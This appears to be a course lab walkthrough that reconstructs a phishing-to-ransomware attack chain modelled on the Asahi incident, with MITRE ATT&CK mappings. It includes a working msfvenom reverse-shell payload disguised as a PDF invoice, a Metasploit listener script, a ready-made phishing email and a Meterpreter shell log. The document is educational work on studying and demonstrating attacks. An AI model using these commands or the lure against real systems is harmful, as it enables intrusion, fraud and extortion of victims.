# 🧪 Attack Simulation Lab Walkthrough (Reconstructed)

> **⚠️ Archive & Recovery Notice:** Due to a malware/virus incident on the local lab workstation during post-project cleanup, the original raw VMware VM snapshots, compiled PoC executables, and source scripts were lost/purged. The technical steps below are **reconstructed directly from the recorded lab demonstration** ([`demo/Demo_Full.mp4`](../demo/Demo_Full.mp4)) and the final project report.

> [!CAUTION]
> **For educational purposes only.** This walkthrough documents techniques observed in the Asahi cyberattack case study. All activities were performed in a fully isolated VMware Host-Only network. Unauthorized reproduction against real systems is **illegal**.

---

## 1. Isolated Lab Topology

```
╔═══════════════════════════════════════════════════════════════╗
║                  VMware Host-Only Network                     ║
║                   (No Internet Access)                        ║
║                                                               ║
║   ┌───────────────────┐         ┌───────────────────────┐    ║
║   │  ATTACKER          │         │  VICTIM                │    ║
║   │  Kali Linux        │◄───────►│  Windows 10 x64        │    ║
║   │  192.168.23.130    │  TCP    │  192.168.23.141         │    ║
║   │                    │  :4444  │  DESKTOP-4K30A40        │    ║
║   │  Tools:            │         │  User: ACERNITRO        │    ║
║   │  - msfvenom        │         │                         │    ║
║   │  - msfconsole      │         │  Desktop files:         │    ║
║   │  - sendEmail       │         │  - TaiLieu.txt          │    ║
║   └───────────────────┘         │  - *.docx, *.xlsx       │    ║
║                                  │  - *.pdf, *.dwg         │    ║
║                                  └───────────────────────┘    ║
╚═══════════════════════════════════════════════════════════════╝
```

| Node | OS / Platform | IP Address | Role |
| :--- | :--- | :--- | :--- |
| **Attacker** | Kali Linux | `192.168.23.130` | C2 server, payload generation, email delivery |
| **Victim** | Windows 10 x64 | `192.168.23.141` | Target endpoint (hostname: `DESKTOP-4K30A40`, user: `ACERNITRO`) |
| **Network** | VMware Host-Only | `192.168.23.0/24` | Completely isolated — no NAT, no bridged, no internet |

---

## 2. Evidence Visible in the Demo

> **Archive limitation:** The original VM snapshots and detailed lab configuration files were not recovered. The environment details below are limited to what is explicitly visible in `Demo_Full.mp4`.

The supplied MP4 is approximately **1 minute 41 seconds** long, at **1780 × 1080 pixels**, and records at **30 frames per second**.

| Item | Observation |
| :--- | :--- |
| Virtualization platform | VMware Workstation |
| Virtual machine 1 | Kali Linux |
| Virtual machine 2 | Windows 10 x64 |

The remaining Kali Linux commands, network addresses, payload details, and Metasploit configuration in this document are reconstructed from the recorded demonstration and from the final project report.

---

## 3. Simulated Kill Chain Execution (Observed in `Demo_Full.mp4`)

### Step 1: Payload Generation (`T1027` Obfuscation / `T1036.007` Double Extension Masquerading)

Generated a disguised invoice executable using `msfvenom` with encoding to evade basic AV:

```bash
# Generate reverse Meterpreter payload with double-extension disguise
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.23.130 \
    LPORT=4444 \
    -e x86/shikata_ga_nai \
    -i 5 \
    -f exe \
    -o File_hoa_don_chuyen_khoan_2026.pdf.exe
```

**Technique Mapping:**
- `T1027` — Obfuscated Files: `shikata_ga_nai` polymorphic XOR encoder (5 iterations)
- `T1036.007` — Masquerading: Double Extension (`.pdf.exe`) to appear as a legitimate PDF invoice
- Filename translates to: *"Bank transfer invoice file 2026.pdf.exe"*

### Step 2: Start Metasploit Multi-Handler

Started the C2 listener using the [`handler.rc`](handler.rc) resource script:

```bash
# Start listener using resource script
msfconsole -r handler.rc
```

**Contents of [`handler.rc`](handler.rc):**

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.23.130
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

### Step 3: Spear-Phishing Email Delivery (`T1566.001`)

Sent a fake logistics/invoice email to the victim with the malicious attachment:

```
From:     invoice@globallogistics.com
To:       victim@company.local
Subject:  [URGENT] Invoice #AS-99281 — Global Logistics Services

Body:
Dear Customer,

Please find attached the bank transfer invoice for your recent
shipment order #AS-99281. Kindly review and confirm the payment
details at your earliest convenience.

Best regards,
Global Logistics Services
Accounts Department

Attachment: File_hoa_don_chuyen_khoan_2026.pdf.exe
```

**Technique Mapping:**
- `T1566.001` — Spearphishing Attachment
- Urgency and authority cues to pressure victim into opening the attachment
- Mimics real logistics communication patterns observed in Asahi incident

### Step 4: Victim Execution & C2 Session (`T1204.002` / `T1059` / `T1082`)

Upon victim opening the attachment:

```
[*] Meterpreter session 1 opened (192.168.23.130:4444 -> 192.168.23.141:59860)

meterpreter > sysinfo
Computer        : DESKTOP-4K30A40
OS              : Windows 10 (10.0 Build 19045)
Architecture    : x64
System Language : en_US
Meterpreter     : x86/windows

meterpreter > shell
Process 1234 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.3803]
(c) Microsoft Corporation. All rights reserved.

C:\Users\ACERNITRO\Desktop>
```

**Technique Mapping:**
- `T1204.002` — User Execution: Malicious File
- `T1082` — System Information Discovery (`sysinfo`)
- `T1059` — Command and Scripting Interpreter (interactive `cmd.exe` shell)

### Step 5: Ransomware Encryption Simulation (`T1486`)

Executed the ransomware PoC module, encrypting files on the victim's Desktop:

```
Before encryption:
  TaiLieu.txt
  BaoCao.docx
  DuLieu.xlsx
  HoaDon.pdf
  ThietKe.dwg

After encryption:
  TaiLieu.txt.encrypted
  BaoCao.docx.encrypted
  DuLieu.xlsx.encrypted
  HoaDon.pdf.encrypted
  ThietKe.dwg.encrypted
```

**Ransomware behavior observed:**
- Targeted file extensions: `.txt`, `.docx`, `.xlsx`, `.pdf`, `.dwg`
- Appended `.encrypted` extension to all affected files
- Triggered a lock-screen ransom demand UI on the victim's desktop
- File contents became unreadable (encrypted)

**Technique Mapping:**
- `T1486` — Data Encrypted for Impact

---

## 4. Mapping Lab Simulation → Real Asahi Incident

| Lab Simulation Step | Corresponding Asahi Attack Phase | Key Difference |
| :--- | :--- | :--- |
| `msfvenom` payload generation | Qilin modular ransomware (Golang/Rust) build | Real-world: more sophisticated, multi-stage dropper |
| Fake invoice email | Fake Yamato/Sagawa shipping alerts to IT/Logistics staff | Real-world: highly personalized spear-phishing with OSINT |
| Meterpreter reverse TCP | Qilin C2 via HTTPS/DNS tunneling | Real-world: encrypted C2, harder to detect |
| Desktop file encryption | XChaCha20 encryption across data center servers | Real-world: simultaneous encryption of 30+ factory systems |
| — *(not simulated)* | 10-day lateral movement (SMB, RDP, Mimikatz) | Critical phase not covered in demo due to scope |
| — *(not simulated)* | 27 GB data exfiltration before encryption | Double extortion element not demonstrated |

---

## 5. Files in This Directory

| File | Description |
| :--- | :--- |
| [`lab-walkthrough.md`](lab-walkthrough.md) | This file — reconstructed attack simulation documentation |
| [`handler.rc`](handler.rc) | Metasploit resource script for the multi-handler listener |
| [`../demo/Demo_Full.mp4`](../demo/Demo_Full.mp4) | Full recorded video of the lab demonstration (1m 40s) |
